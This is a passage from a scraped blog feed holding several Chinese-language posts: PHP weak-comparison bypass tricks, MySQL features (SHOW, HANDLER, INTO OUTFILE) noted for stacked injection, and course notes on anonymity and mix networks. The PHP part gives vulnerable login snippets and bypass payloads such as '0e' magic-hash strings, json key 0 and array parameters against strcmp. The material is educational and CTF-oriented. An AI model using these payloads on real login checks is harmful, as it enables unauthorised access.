FLOAT_NUM_STRING {WHITESPACES} [+-]? ({DNUM} | {EXPONENT_DNUM}) {WHITESPACES} NUM_STRING ({INT_NUM_STRING} | {FLOAT_NUM_STRING}) \u0026lt;?php $foo = 1 + \u0026#34;10.5\u0026#34;; // $foo is float (11.5) $foo = 1 + \u0026#34;-1.3e3\u0026#34;; // $foo is float (-1299) $foo = 1 + \u0026#34;bob-1.3e3\u0026#34;; // TypeError as of PHP 8.0.0, $foo is integer (1) previously $foo = 1 + \u0026#34;bob3\u0026#34;; // TypeError as of PHP 8.0.0, $foo is integer (1) previously $foo = 1 + \u0026#34;10 Small Pigs\u0026#34;; // $foo is integer (11) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously $foo = 4 + \u0026#34;10.2 Little Piggies\u0026#34;; // $foo is float (14.2) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously $foo = \u0026#34;10.0 pigs \u0026#34; + 1; // $foo is float (11) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously $foo = \u0026#34;10.0 pigs \u0026#34; + 1.0; // $foo is float (11) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously ?\u0026gt; 通过以上的知识我们也能明白为什么 \u0026ldquo;admin1\u0026rdquo;==1 =\u0026gt;False 的原因，因为其会被转换成0而不是1， 而\u0026quot;0e123456\u0026quot;==\u0026ldquo;0e4456789\u0026quot;则是因为两边都是科学计数法，结果都为0 实例 接下来我们跟着Mrsm1th师傅来看看几个实例加强一下印象 md5绕过(Hash比较缺陷)\n\u0026lt;?php if (isset($_GET[\u0026#39;Username\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;password\u0026#39;])) { $logined = true; $Username = $_GET[\u0026#39;Username\u0026#39;]; $password = $_GET[\u0026#39;password\u0026#39;]; if (!ctype_alpha($Username)) {$logined = false;} // 检查$Username中的所有字符是否都是字母 if (!is_numeric($password) ) {$logined = false;} if (md5($Username) != md5($password)) {$logined = false;} if ($logined){ echo \u0026#34;successful\u0026#34;; }else{ echo \u0026#34;login failed!\u0026#34;; } } ?\u0026gt; 这里要求 $Username 为字母组成的字符串，要求 $password 为数字，同时要求他们的md5结果一致 那么我们的目的，就是让两个md5后的值，用 != 比较，也就是在强制转换为数字之后再进行比较 这里给出一组结果为\u0026quot;0e\u0026quot;开头的字符串，0e开头意味着会被当作是科学计数法来使用，并且结果都为0，自然也就都相等 QNKCDZO 0e830400451993494058024219903391 240610708 0e462097431906509019562988736854 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 来源： https://www.jianshu.com/p/d3a9e7de0b12 json绕过\n\u0026lt;?php if (isset($_POST[\u0026#39;message\u0026#39;])) { $message = json_decode($_POST[\u0026#39;message\u0026#39;]); $key =\u0026#34;*********\u0026#34;; if ($message-\u0026gt;key == $key) { echo \u0026#34;flag\u0026#34;; } else { echo \u0026#34;fail\u0026#34;; } } else{ echo \u0026#34;~~~~\u0026#34;; } ?\u0026gt; 在这个情况下 $key 的值我们不知道，无法给出准确的输入，但是却可以利用 0==\u0026lsquo;admin\u0026rsquo; 的形式来进行绕过，即我们输入0，使相等判断时的key的值被强制转换为0来进行绕过 payload: message={\u0026ldquo;key\u0026rdquo;:0} array_search is_array绕过\n\u0026lt;?php if(!is_array($_GET[\u0026#39;test\u0026#39;])){exit();} $test=$_GET[\u0026#39;test\u0026#39;]; for($i=0;$i\u0026lt;count($test);$i++){ if($test[$i]===\u0026#34;admin\u0026#34;){ echo \u0026#34;error\u0026#34;; exit(); } $test[$i]=intval($test[$i]); } if(array_search(\u0026#34;admin\u0026#34;,$test)===0){ echo \u0026#34;flag\u0026#34;; } else{ echo \u0026#34;false\u0026#34;; } ?\u0026gt; 脚本要求GET输入的值 test 是一个数组，并且数组中的每一个元素都不能等于 admin ，但是又要求在 array_search 的搜索中需要有 admin array_search(mixed $needle, array $haystack, bool $strict = false): int|string|false $needle代表查询的字符串，$haystack是被查询的数组，而 $strict 参数的设置也决定了是否能够进行绕过，即是否进行“===”比较，如果没有设置，那么如果我们的字符串中有0，在进行比较的时候就会使 $needle 被转换成为0来进行比较 payload: test[]=0 进行绕过 \u0026lt;?php $a=array(0,1); var_dump(array_search(\u0026#34;admin\u0026#34;,$a)); // int(0) =\u0026gt; 返回键值0 var_dump(array_seach(\u0026#34;1admin\u0026#34;,$a)); // int(1) ==\u0026gt;返回键值1 ?\u0026gt; strcmp漏洞绕过 php -v \u0026lt;5.3\n\u0026lt;?php $password=\u0026#34;***************\u0026#34; if(isset($_POST[\u0026#39;password\u0026#39;])){ if (strcmp($_POST[\u0026#39;password\u0026#39;], $password) == 0) { echo \u0026#34;Right!!!login success\u0026#34;;n exit(); } else { echo \u0026#34;Wrong password..\u0026#34;; } ?\u0026gt; 我们在上面的strcmp函数的绕过中也有过讲解，strcmp是用来比较两个字符串的长度，既然这里出现了\u0026rdquo;== 0\u0026quot; 那我们就应该想办法往弱类型比较绕过上去靠，那么当strcmp所接受的是数组的时候，将发生错误，并返回0 payload: password[]=xxx switch绕过\n\u0026lt;?php $a=\u0026#34;4admin\u0026#34;; switch ($a) { case 1: echo \u0026#34;fail1\u0026#34;; break; case 2: echo \u0026#34;fail2\u0026#34;; break; case 3: echo \u0026#34;fail3\u0026#34;; break; case 4: echo \u0026#34;sucess\u0026#34;; //结果输出success; break; default: echo \u0026#34;failall\u0026#34;; break; } ?\u0026gt; switch本质上还是进行弱类型比较，我们可以用同样的方法进行绕过 ","date":"2022-06-08T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/php_bypass_tricks/","title":"PHP特性绕过技巧"},{"content":"Mysql拓展知识 MySQL中show语法使用总结 https://www.cnblogs.com/saneri/p/6963583.html 我们一般接触到的Mysql语句都是增删改查数据库中存储的数据，但是Mysql还提供了很多对于其他信息的查询，这样的语句可以用于例如堆叠注入的地方。 show命令就可以显示很多的metadata的信息 Figure 1: help show: https://dev.mysql.com/doc/refman/5.7/en/show.html\n帮助查看： mysql\u0026gt; help show mysql\u0026gt; help SHOW TABLE; mysql\u0026gt; help SHOW WARNINGS 1.显示mysql中所有数据库的名称. mysql\u0026gt;show databases; 2.显示当前数据库中所有表的名称 mysql\u0026gt;show tables; 或 mysql\u0026gt;show tables from database_name; 3.显示表中列名称 mysql\u0026gt;show columns from database_name.table_name; 4.查看某MySQL用户的使用权限 mysql\u0026gt;show grants for user_name; 5.显示create database 语句是否能够创建指定的数据库,并可以查看到创建库语句的SQL信息。 mysql\u0026gt;show create database database_name; 6.显示create table 语句是否能够创建指定的数据表,并可以查看到表创建语句的SQL信息。 mysql\u0026gt;show create table table_name; 7.显示安装以后可用的存储引擎和默认引擎。 mysql\u0026gt;show engines; 8.显示最后一个执行的语句所产生的错误、警告和通知 mysql\u0026gt; show warnings; 9.只显示最后一个执行语句所产生的错误 mysql\u0026gt;show errors; 10.显示系统中正在运行的所有进程，也就是当前正在执行的查询. mysql\u0026gt; show processlist\\G 11.查看所有存储过程。 mysql\u0026gt; show procedure status; 12.查看某个存储过程内容 show create procedure 存储过程名称; 13.查看函数的内容. show create function func_name; 预编译语句 Prepare statement Syntax: PREPARE stmt_name FROM preparable_stmt PREPARE 语句会把一个SQL语句赋值给一个变量名stmt_name用于后面的引用。 预编译语句会被 EXECUTE 执行，然后被 DEALLOCATE PREPARE 释放 以下是一个使用预编译语句的例子，使用\u0026rsquo;?\u0026lsquo;来占位，然后通过 SET 来赋值再结合在一起使用，最后用 DEALLOCATE PREPARE 来释放 mysql\u0026gt; PREPARE stmt1 FROM \u0026#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse\u0026#39;; mysql\u0026gt; SET @a = 3; mysql\u0026gt; SET @b = 4; mysql\u0026gt; EXECUTE stmt1 USING @a, @b; +------------+ | hypotenuse | +------------+ | 5 | +------------+ mysql\u0026gt; DEALLOCATE PREPARE stmt1; Index 索引 参考： 一文搞懂MySQL索引（清晰明了） MySQL索引实现原理分析 Basic 基础概念 Index，索引，是Mysql数据库中一个用来提高表内查询速度的数据结构。 如果没有Index，那么当我们想要从一个有一万条记录的表中找到我们想要的一列时，最坏的情况就是要遍历一万条数据才能发现匹配的; 但是如果是有Index的话，就可以像字典一样，提前找到其位置，然后根据位置快速得到其内容，Index的使用极大的提升了Mysql的查询速度和效率； Index的使用将极大的帮助SELECT语句，但是会降低INSERT 以及 UPDATE的速度：因为对于table的变动还需要更新index的信息； 我在学习的时候有Index的概念的时候还是没有跳脱出之前增删改查的语法的使用，一直在找资料想看看Index是不是一个独立的结构，具体要创建以及在查询中使用，慢慢开始理解之后才突然意识到Index的创建其实就是一种字典索引的建立，只要创建了合适的索引，那么再下一次进行select语句的时候，Index就会自动加速本次查询，也就是我想找的如何使用Index的答案。 接着我就看到了W3schools给的解释，就非常清晰了：The users cannot see the indexes, they are just used to speed up searches/queries :) 接下来我们就来看看具体要如何创建Index Index的语法 创建一个最基本的Index，允许存在重复的值 CREATE INDEX index_name ON table_name (column1, column2, ...); 例子 CREATE INDEX idx_lastname ON Persons (LastName); CREATE INDEX idx_pname ON Persons (LastName, FirstName); 创建一个唯一的Index，不允许重复的值 CREATE UNIQUE INDEX index_name ON table_name (column1, column2, ...); 通过修改表结构来添加索引 ALTER table tableName ADD INDEX indexName(columnName) 如果是CHAR，VARCHAR类型，length可以小于字段实际长度；如果是BLOB和TEXT类型，必须指定length。 创建表的时候直接指定INDEX CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, INDEX [indexName] (username(length)) ); 删除索引 DROP INDEX [indexName] ON mytable; Index使用的准则与场景 之前我们提到了Index本质是一个数据结构，那么作为一个数据结构来存储大量的数据，势必也需要占用物理磁盘，那么如何合理的利用索引来加速查询的同时又减少开销呢？ 应当创建索引的列\n在 经常需要搜索的列 上，可以加快搜索的速度 在作为 主键的列 上，强制该列的唯一性和组织表中数据的排列结构 在经常用在 连接（JOIN）的列 上，这些列主要是 外键 ，可以加快连接的速度 在经常需要 根据范围 （\u0026lt;，\u0026lt;=，=，\u0026gt;，\u0026gt;=，BETWEEN，IN）进行搜索的列上创建索引，因为 索引已经排序 ，其指定的范围是连续的 在经常需要 排序 （order by）的列上创建索引，因为索引已经排序，这样查询可以利用索引的排序，加快排序查询时间； 在经常使用在 WHERE子句中的列 上面创建索引，加快条件的判断速度。 不该创建索引的列\n对于那些在查询中 很少使用或者参考reference的列 不应该创建索引。 若列很少使用到，因此有索引或者无索引，并不能提高查询速度。相反，由于增加了索引，反而降低了系统的维护速度和增大了空间需求。 对于那些只有 很少数据值 或者 重复值多的列 也不应该增加索引。 这些列的取值很少，例如人事表的性别列，在查询的结果中，结果集的数据行占了表中数据行的很大比例，即需要在表中搜索的数据行的比例很大。增加索引，并不能明显加快检索速度。 对于那些定义为 text, image和bit 数据类型的列不应该增加索引。 这些列的数据量要么相当大，要么取值很少。 当该列 修改(Insert, Update)性能要求远远高于检索(Select)性能 时，不应该创建索引。（修改性能和检索性能是互相矛盾的） Index的实现原理 那么Index究竟使用了什么数据结构来进行存储进而加快了检索速度呢？ 我们以常见的InnoDB来举例，其使用的是B+Tree来进行索引结构，将原本需要对所有的记录依次匹配记录的方式变为了通过树来进行二元判断逐渐缩小范围 B+Tree的特点是其本身在叶节点就会存储完整的数据记录，因此我们可以说，索引所存储的文件，就是数据表其本身，以及： 所有关键字都出现在叶子结点的链表中，且链表中的关键字恰好是有序的； 不可能在非叶子结点命中； 非叶子结点相当于是叶子结点的索引，叶子结点相当于是存储（关键字）数据的数据层； 每一个叶子节点都包含指向下一个叶子节点的指针，从而方便叶子节点的范围遍历。 更适合文件索引系统 具体的分类与实现方法我们放在下面讲，这里先有一个基本的认识 Index的分类 逻辑分类\n按功能划分\n主键索引：将一张表的主键列设为索引，特点是一张表只能有一个主键索引，不允许重复，也不允许为NULL ALTER TABLE TableName ADD PRIMARY KEY(column_list); 反过来说，一个有主键的数据表的存储形式就是一个主键索引的文件 唯一索引：被索引的列的值不允许重复，但允许为NULL，一张表可以创建多个唯一索引；同时，如果是组合索引，列值的组合也必须唯一 CREATE UNIQUE INDEX IndexName ON `TableName`(`字段名`(length)); # 或者 ALTER TABLE TableName ADD UNIQUE (column_list); 普通索引：一张表可以创建多个普通索引，一个普通索引可以包含多个字段，允许数据重复，允许NULL值插入 CREATE INDEX IndexName ON `TableName`(`字段名`(length)); # 或者 ALTER TABLE TableName ADD INDEX IndexName(`字段名`(length)); 全文索引：查找文本中的关键词，主要用于全文内容的检索 按被索引的列数划分\n单例索引：一个索引只包含一个列，一个表可以创建多个单例索引 组合/联合索引：一个组合索引包含两个或两个以上的列组合成为索引检索的对象。 其满足“最左前缀”原则，即使用where时条件要按照建立所以的字段的排列方式设置才能使索引生效 Figure 3: 联合索引：将几个列的值组合起来进行索引\n物理分类\n物理分类主要通过实现Index实例的方法氛围聚簇索引和非聚簇索引（也叫辅助索引或者耳机索引），那么主要的区别就是 Clustered Index 聚簇索引\n其主要特点就是，数据的存储与索引是放在一起的，索引完成之后，数据也随之被找到。 Figure 4: B+Tree\n非聚簇索引\n数据和索引是分开的，其B+Tree叶子结点存放的是真正数据的地址而非数据的内容 Figure 5: 辅助索引：数据与索引分开\nIndex: pros \u0026amp; cons 减少了服务器扫描的数据量，大大加快了数据的检索速度 主要优点： 索引大大减小了服务器需要扫描的数据量，从而大大加快数据的检索速度，这也是创建索引的最主要的原因。 可以加速表和表之间的连接，特别是在实现数据的参考完整性方面特别有意义。 在使用分组和排序子句进行数据检索时，同样可以显著减少查询中分组和排序的时间。 通过使用索引，可以在查询的过程中，使用优化隐藏器，提高系统的性能。 主要缺点： 创建索引和维护索引要耗费时间，这种时间随着数据量的增加而增加 索引需要占物理空间，除了数据表占用数据空间之外，每一个索引还要占用一定的物理空间，如果需要建立聚簇索引，那么需要占用的空间会更大 对表中的数据进行增、删、改的时候，索引也要动态的维护，这就降低了整数的维护速度 如果某个数据列包含许多重复的内容，为它建立索引就没有太大的实际效果。 对于非常小的表，大部分情况下简单的全表扫描更高效； Mysql中key(primary key, unique key) v.s. index的区别 我们在优化Mysql的时候，经常会看到key与index的连用或者替换，这同样也是我非常的困扰，我们今天就来好好理一理，到底如果来使用这两个名词 key key包含两层含义 约束，表示对于列的一些特殊的要求 索引，当我们将一列设置为key时，其自动就会创建一个Index（可用show index from table_name;进行查询） primary key 约束：列的值唯一,非空，唯一标识 为这个主键列（这个key）建立一个主键索引（InnoDB中就会在叶子节点存储记录的真实数据） unique key 约束：保证列值的唯一性 为这个列建立一个唯一索引 foreign key 约束：外键的约束，规范数据的引用完整性 为这个外键建立一个普通索引 DESCRIBE/EXPLAIN Mysql文档：13.8.2 EXPLAIN Statement EXPLAIN的目的可以帮助分析一条select语句具体是如何进行查询的，包括对于引用，索引的使用； {EXPLAIN | DESCRIBE | DESC} tbl_name [col_name | wild] {EXPLAIN | DESCRIBE | DESC} [explain_type] {explainable_stmt | FOR CONNECTION connection_id} Figure 7: explain example\nDESCRIBE语句通常被用来解析table的结构： Figure 8: DESCRIBE语句描述table的结构\nHandler 句柄 参考： 【MySQL】MySQL 之 handler 的详细使用及说明 13.2.4 HANDLER Statement HANDLER 语句提供了直接访问table storage engine的接口，适用于InnoDB and MyISAM 表 HANDLER ... OPEN 语句可以打开一个table，并通过接下来的 HANDLER ... READ 语句来进行访问，一旦打开后就开启了一个独立的会话，并且不会被其他的会话共享直到 HANDLER ... CLOSE 之前都不会消失 Basic Syntax, 基础语法： # 打开一张表，并且可以选择alias HANDLER tbl_name OPEN [ [AS] alias] # 1. 查看表所创建的索引来检索反过来查看table的内容， HANDLER tbl_name READ index_name { = | \u0026lt;= | \u0026gt;= | \u0026lt; | \u0026gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] # 2. 同时也可以用FIRST, NEXT, PREV, LAST来辅助索引进行遍历 HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ] # 3. 不通过索引来查看表（速度变慢，检索的形式也变少了） # READ FIRST: 获取句柄的第一行 # READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行） # 最后一行执行之后再执行 READ NEXT 会返回一个空的结果 HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE SELECT \u0026hellip; INTO 参考： Mysql文档：13.2.9.1 SELECT \u0026hellip; INTO Statement SQL学习 之 into outfile 和 into dumpfile SELECT ... INTO 表达式允许由SELECT语句查询到的结果存储到用户自定义变量或者文件中，mysql提供了三种形式： SELECT \u0026hellip; INTO var_list SELECT \u0026hellip; INTO var_list可以将查询到的column中的值存储在用户自定义变量当中 SELECT * INTO @myvar FROM t1; SELECT * FROM t1 INTO @myvar FOR UPDATE; SELECT id, data INTO @x, @y FROM test.t1 LIMIT 1; 需要注意的是，查询的列数必须与自定义变量的数量一致，同时只能取一行的值（因为自定义变量也只能存储一行中的某一个具体的值） Figure 9: SELECT \u0026hellip; INTO var_list\nSELECT \u0026hellip; INTO OUTFILE/DUMPFILE \u0026lsquo;file_name\u0026rsquo; SELECT \u0026hellip; INTO OUTFILE \u0026lsquo;file_name\u0026rsquo; 可以将查询到的多行写入文件当中，并且字段和行终止符都可以作为格式输出，由于存在服务器上的文件读写操作，因此必须要拥有文件的权限才能使用。 同时 file_name 不能是已经存在文件。 SELECT \u0026hellip; INTO OUTFILE一般用于在服务器本地打开文件并存储，不太适用于其他远程host 而SELECT \u0026hellip; INTO DUMPFILE \u0026lsquo;file_name\u0026rsquo;只能写入一行，并且输出中不存在任何格式 例子： Figure 10: SELECT \u0026hellip; INTO OUTFILE/DUMPFILE \u0026lsquo;file_name\u0026rsquo;\n结果： Figure 11: OUTFILE识别格式，DUMPFILE只能得到一行（实际情况是两行）\nUser-Defined Variables 用户自定义变量 Mysql文档：《9.4 User-Defined Variables》 SET @var_name = expr [, @var_name = expr] ... SET @var_name := expr [, @var_name := expr] ... 用户可以以上使用 SET 语句来存储自定义变量以供后续的sql语句使用。 自定义变量的格式为 @var_name, 其中 var_name 的部分可以使用字母表以及., ., 以及$三种符号，也可以用引号包裹来使用任意字符： Figure 12: @var_name格式\n所有的自定义变量只在当前用户所开启的session会话中有效，并且一旦用户退出结束该session，所有的变量都会被清空。 同时自定义变量是不区分大小写的！ Locking Reads 上锁读取 参考： Mysql文档：《14.7.2.4 Locking Reads》 深入理解SELECT \u0026hellip; LOCK IN SHARE MODE和SELECT \u0026hellip; FOR UPDATE mysql 共享锁(读写锁) 修改数据问题（update,insert）（LOCK IN SHARE MODE） Locking Reads的目的是为了保护在多个client的多个session会话中，对于数据读取的操作的一致性。 InnoDB提供了两种形式的保护：共享锁以及排他锁 SELECT \u0026hellip; LOCK IN SHARE MODE，共享锁 Share Locks 共享锁，又称读锁，S锁，上锁之后该资源只能读不能修改以及删除，同时其他用户也可以给资源上共享锁； 使用场景：简单来说，共享锁适用于，你不要修改该数据，只需要保证数据的完整性的情况下，使用共享锁； 原因就是要避免死锁： 当client A对于目标数据上了共享锁之后，这段数据只能读，而不能改，只有释放之后才能进行修改和删除； 此时client B也对目标数据上了共享锁，并且想要修改这段数据，那么就要等待client A释放共享锁； 可是此时client A也想要对目标数据进行修改，那么就要等待client B释放共享锁； 双方都等待对方释放共享锁，因此双方也不会主动释放自己的共享锁，造成死锁； 因此我们说共享锁适用于两张表存在关系时的写操作，例如 我们假设有child， parent两张表，child的外键是parent的主键uuid； 当client A想要修改child的一条数据时，其需要保证parent中的主键没有被修改，否则这条child数据就会失去意义； 因此client A就需要给parent中对应主键的记录加上 共享锁, 然后再修改child中的记录（使用排他锁）； 这样就可以保证parent中的主键没有被修改； 同时当client B也给parent中主键的对应记录加上共享锁，并且想要进行修改的时候，只需要等待client A完成对于child的作业之后，释放共享锁，即可开始操作，不会发生死锁。 对查询到的记录上共享锁： SELECT * FROM parent WHERE NAME = \u0026#39;Jones\u0026#39; LOCK IN SHARE MODE; SELECT \u0026hellip; FOR UPDATE，排他锁 Exclusive Locks 排他锁，又称为写锁、独占锁，X锁，一旦有一个用户对一段数据上了排他锁，那么其他用户不能再对该数据上任何锁，也不能进行读取和修改： 对t1中查询到的数据上排他锁，但是对于t2无法上锁： SELECT * FROM t1 WHERE c1 = (SELECT c1 FROM t2) FOR UPDATE; 对t1, t2中查询到的数据上锁： SELECT * FROM t1 WHERE c1 = (SELECT c1 FROM t2 FOR UPDATE) FOR UPDATE; ","date":"2022-06-05T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mysql_tricks/","title":"Mysql拓展知识"},{"content":"NSE Week 10: Privacy and anonymity Privacy and Anonymity Privacy is about you choosing what you let other people know which means keep confidentiality of information that you don\u0026rsquo;t want to share with others However, Anonymity is about conceal your identity, the confidentiality of your identity, no one know what you are doing. Privacy and anonymity on public networks However, the confidentiality of both the data you want to transmit or your identity is exposed to Internet. Internet is designed as a public network Devices in LAN can see your traffic Intermediate routers can see all traffic that passes through them Remember what we leanred in CIS? Email is actually a post card but not a letter, which means everyone could see the content on it with envelop protects Routing information is public IP packet will contain source and destination for routing It is easy to figure out who is talking to whom Encryption dose NOT hide identities encryption only happen on payload but not the routing information in header Even IPsec have to reveal the IP address of IPsec gateways Why is anonymity so important? packet headers exposes two ends of communication packet routes can be tracked (traffic analysis) encrypted payload is still visible (cryptanalysis) Some applications: Privacy hide online transactions, web browsing Untraceable email corporate whistle-blowers political dissidents confidential business negotiations Digital cash unlinkable to buyer\u0026rsquo;s identity Anonymous electronic voting (e-voting) Censorship-resistant publishing Anonymity Anonymity中最重要的一点：你只能在一群人中才能使自己匿名，即所有人都在一起发送，接收，做出同样的行动，才能隐藏个人的行为 You are only anonymous within a group is your actions You cannot be anonymous by yourself!!! Anonymity由三个特性 Anonymity 从茫茫多的活动中隐藏自己的活动，而不要显眼的被挑出来 Unlinkability 无法将行动与个人联系起来 比如发完邮件之后，发件人和邮件就没有关联了 Unobservability 很难实现 既别人无法意识到这件事情到底发生没有 笔名就是一个简单的方法，用来隐藏自己的身份（用户名） Attacks on anonymity?\nPassive traffic analysis : - 从网络活动中发现谁与谁在通信 - 为了隐藏自己的活动，每个人必须要还要处理别人的traffic，即每个人都在做一样的事情，分不清真正想要做这件事情的人是谁 Active traffic analysis : - 注入数据包或者将signature注入数据流中进行进一步观察 Compromise of network nodes : - 黑入网络中的节点，然后被动的收集数据 - 因此不能相信任意一个网络节点，被黑以后都是不明显的 Proxy也可以用来进行匿名 sender通过proxy改变了自己的信息，使原始的sender不会被找到 receiver则通过广播或者多播发送给整一个匿名组用户，其中只有一个真正的接收者 弱点在哪儿呢？ 那就是Proxy知道一切的事情，如果proxy被黑客控制，那么一切都没有意义了 我们也可以用cascaded proxy chains，mix networks来counter这个攻击 Cascaded proxies with encryption\n何谓cascaded proxies级联代理呢？就是我们通过多层的代理，每一层都proxy都拥有一个private key来进行解密，再传递给下一个proxy继续解密，只有最后一个proxy服务器知道最初始的数据，然后广播到匿名组里去 但是流量分析还是可以实现，因此我们需要mix networks Mix networks 主要目的是为了建立一个匿名的channel 在垃圾邮件出现之前，大家都觉得匿名邮件是个好东西，从而衍生出了很多的remailers Mix = Public-key cryptography + trusted re-mailer Publick key就作为持久的假名，就类似于Bitcoin中的address Untrusted communication medium: 被设计在一个攻击者可以 获取所有的source/destination信息，以及所传递的信息 可以修改注入删除所有的 messages 但是唯一做不到的事情就是不能找到这些信息之间的关系，cannot coorelate plaintext and ciphertext,也无法进行伪造（不知道如何加密） Using a single Mix 我们用 Mix 代表一个邮件处理系统 A发出一条信息给Mix,使用mixer的public key进行加密，Mix会解密之后重新组装，然后发送给一个匿名组所有的用户，每一个用户所接受到的信息都是不同的 攻击者可以看到所有的senders and receivers但是却不能将发送的消息和经由Mix重新组装后的消息所联系起来 其中r1, r0 这些内容是为了满足加密算法所需要的byte数而进行的padding Foiling traffic analysis: four requirements\n为了防止进行流量分析，mix还提供了四个要求 Agents/mixes work with uniformly sized items 要求所有的信息都是同样格式的（比如所有的信息都被padded到相同的长度的block后加密） Order of arrival hidden by outputting items in batches 通过批量输出信息到匿名组来隐藏顺序 Repeated information must be blocked 不允许重复的信息，需要通过过滤器来筛查重复信息 Sufficient traffic from a large anonymity set if required 需要大量的匿名组用户进行数据的发送 太少的话就会削弱anonymity 可以让clients定期发送或者接受dummy messages假信息 Generating receipts\nMix同样可以用来生成receipt代表message被收到了 这里的 c 是很大的，我觉得应该就是为了保持相等的格式，可以用很多0来填充 Mix networks 我们已经看过了一个单独的Mix是如何工作的，其实和之前的proxy很类似，都存在一个缺点，就是一旦被攻击，那么所有信息都会暴露 因此我们在这里采取同样的策略，即使用级联的Mix服务器相连来处理 每一个Mix都属于不同的administrative domain，这里应该想说的是不属于同一个地方管辖，也就不会因为一个被黑入了，就会影响其他的servers 通过多个Mix server联合使用，只要还有一个server没有被黑入，那么通信就还是匿名的 我们假设network中存在着多个Mix server，那么Alice就需要选择Mix-path来决定路经那几个server，然后使用对应的密钥进行加密再发送给Bob Alice 根据Mix-path选择Mix server的public key对数据进行padding与加密 每一个途径的Mix-server用自己的private key解密后再传达给下一个 最终最后一个Mix server就和我们之前提到过的那样发送给匿名组 那么既然最后一个Mix server又变成了single Mix-server中最简单的模式，难道被攻破之后不是毫无意义了吗？ 这里要注意的是，每一个Mix server也就是仅仅只能知道前一个Mix server的信息，发送方的信息根本已经无从知晓了 Untraceable return addresses 如何匿名发送回复消息表示信息收到了呢？ Single Mix case (with key pk_mix1): 发送方在自己的数据里包含 return address: {r1, A_x}_pk_mix1, pk_x r1, random string, can be used as a shared key pk_x, a fresh public key Ax 真实的地址 接受者回复： {r1, A_x}_pk_mix1, {r0, M\u0026rsquo;}pk_x 通过 fresh public key对数据进行加密 Mix解密之后得知真实的地址是Ax，然后回复给A 级联的Mix servers的处理方式 同样的办法，A会附带自己的地址以及一个pk_x,然后B在回复的时候会一层层根据选择的Mix-path上的Mix server的public key进行层层加密后返回 Mix networks: attacks Tracing a message 因为存在大量的dummy messages假消息而不可被追踪 Replay attack, 用重复的messsage进行攻击 但是每一个 Mix server 中都有一个重复信息的过滤器，也不可能发生 Mix networks: n-1 attack n-1 attack 是一种active attack, attacker 通过flooding一个node，使一个node上大部分的数据都是其做知晓的，那么剩下来的内容就很容易进行分析了 如何进行防御呢？ 使用Hearbeat message: 每一个Mix server都会检测自己的网络环境，然后观察发出的消息收到的回复情况，我们称为heartbeat messages心跳 当Mix server收到了flooding attack其无法判断哪些流量是好的还是攻击者的流量，但是通过对于 heatbeat message在这些流量的比例的判断，来主动增加网络流量中的dummy message从而与flooding数据包进行抗衡，增加匿名性 Mix networks: advantages 匿名化的程度非常高 Mix input and output 之间无法被联系起来 只要有一个Mix server没有被入侵就还能保证匿名性 只要有足够多的dummy traffic, anonymity set就是整一个网络 新的密码学的实践 连receiver都可以不知道sender是谁 同时这封匿名的邮件是可以被certified的，可以由receiver以及路上的每一个Mix进行签名 Mix networks: disadvantages 级联的 Mix server意味着每一个server上都要进行大量的加密解密结算，非常消耗资源 延迟非常高，email还可以接受，但是网页浏览就没办法了 Dummy message的开销很大 如何搭建一个低延迟的匿名环境是一个挑战 Use public-key cryptography to establish a “circuit” with pairwise symmetric keys between hops on the circuit. Then use symmetric decryption and re-encryption to move data messages along the established circuits. Each node behaves like a mix; anonymity is preserved even if some nodes are compromised Dining cryptographers 三个的密码学家在一起吃晚饭，吃完饭之后需要结账，他们有两个选择，一是报销让NSA付钱，要么他们中的一个付钱，但是付钱的那个人不希望其他两个人知道（别问万一两个人都想付钱怎么办233），他们相出了一个办法可以让这一切成立 每个密码学家都抛一枚硬币，并向其左边的邻居展示 因此每个密码学都能看到两枚硬币，他自己的和他右边的邻居的 每个密码学家需要宣称两枚硬币是否相同 付钱的那位密码学家会撒谎（说反话） 那么如果说“相同的”是单数 =\u0026gt; NSA报销 如果是偶数，他们其中一个人付钱了 但是其他人不知道谁付钱了 Three-person DC protocol 假设三位密码学家：C1, C2, C3投掷了硬币，其结果为bi 每位密码学家都与左边的邻居共享了自己的信息 每位密码学家都将自己所看到的两枚硬币的情况进行计算di = bi XOR bi-1 bi表示密码学家自己的硬币 bi-1表示右边邻居的情况 要注意的是d0 = d3 and b0 = b3因为绕了一圈了 如果没有付钱，那就直接宣称计算的结果di,如果付钱了，那就宣称di XOR 1 Proof 我们假设有三位密码学家所宣称的值为：A1, A2, A3 如果没付钱了，那么Ai = di 